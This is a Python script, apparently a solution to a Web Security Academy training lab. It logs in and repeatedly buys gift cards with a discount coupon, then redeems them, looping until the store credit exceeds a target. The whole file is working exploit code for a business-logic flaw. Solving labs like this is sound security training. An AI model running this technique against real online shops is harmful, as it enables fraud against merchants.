import re

import requests
from bs4 import BeautifulSoup

# TODO: coloque seu lab id
BASE_URL = "https://0ac9004d037e049580755df0003e006a.web-security-academy.net"
USERNAME = "wiener"
PASSWORD = "peter"
TARGET_CREDIT = 1400
GIFT_CARD_NET_PRICE = 7

session = requests.Session()


def get_csrf(url):
    """Extrai CSRF token de uma página."""
    r = session.get(url)
    match = re.search(r'name="csrf" value="([^"]+)"', r.text)
    assert match, f"CSRF não encontrado em {url}"
    return match.group(1)


def login(csrf_token):
    print("Fazendo login...")
    r = session.post(
        f"{BASE_URL}/login",
        data={"username": USERNAME, "password": PASSWORD, "csrf": csrf_token},
    )
    assert r.status_code == 200, "Login falhou"
    print("Login OK")


def get_credit():
    """Lê o saldo atual da conta."""
    r = session.get(f"{BASE_URL}/my-account")
    match = re.search(r"Store credit:\s*\$([0-9.]+)", r.text)
    assert match is not None, "Saldo não encontrado"
    return float(match.group(1))


def add_gift_cards_to_cart_with_discount(gift_card_amount):
    csrf = get_csrf(f"{BASE_URL}/my-account")
    session.post(
        f"{BASE_URL}/cart",
        data={
            "csrf": csrf,
            "productId": "2",
            "redir": "PRODUCT",
            "quantity": str(gift_card_amount),
        },
    )
    print(f"Adicionado gift card ao carrinho: {gift_card_amount}")

    csrf = get_csrf(f"{BASE_URL}/cart")
    session.post(f"{BASE_URL}/cart/coupon", data={"csrf": csrf, "coupon": "SIGNUP30"})


def extract_gift_card_codes(html):
    soup = BeautifulSoup(html, "html.parser")

    gift_card_codes = []
    for table in soup.find_all("table"):
        headers = table.find_all("th")
        if any(th.get_text(strip=True) == "Code" for th in headers):
            for row in table.find_all("td"):
                if not row:
                    continue
                gift_card_codes.append(row.get_text(strip=True))

    return gift_card_codes


def redeem_gift_card(gift_card_num, gift_card_code):
    csrf = get_csrf(f"{BASE_URL}/my-account")
    response = session.post(
        f"{BASE_URL}/gift-card", data={"csrf": csrf, "gift-card": gift_card_code}
    )
    assert response.status_code == 200, (
        f"Gift card {gift_card_num} ({gift_card_code}): ",
        f"falha ao resgatar (status {response.status_code})",
    )

    print(
        f"Gift card {gift_card_num} ({gift_card_code}): gift card resgatado com sucesso!"
    )


def main():
    login(get_csrf(f"{BASE_URL}/login"))

    initial_credit = get_credit()
    print(f"Crédito inicial: ${initial_credit:.2f}\n")

    credit = initial_credit
    while credit <= TARGET_CREDIT:
        gift_card_amount = min(99, int(credit // GIFT_CARD_NET_PRICE))
        add_gift_cards_to_cart_with_discount(gift_card_amount)

        csrf = get_csrf(f"{BASE_URL}/cart")
        response = session.post(f"{BASE_URL}/cart/checkout", data={"csrf": csrf})
        gift_card_codes = extract_gift_card_codes(response.text)
        print(f"Gift card obtidos: {gift_card_codes}")

        for i, gift_card_code in enumerate(gift_card_codes, 1):
            redeem_gift_card(i, gift_card_code)

        credit = get_credit()
        print(f"Crédito atual:\t${credit:.2f}")


if __name__ == "__main__":
    main()
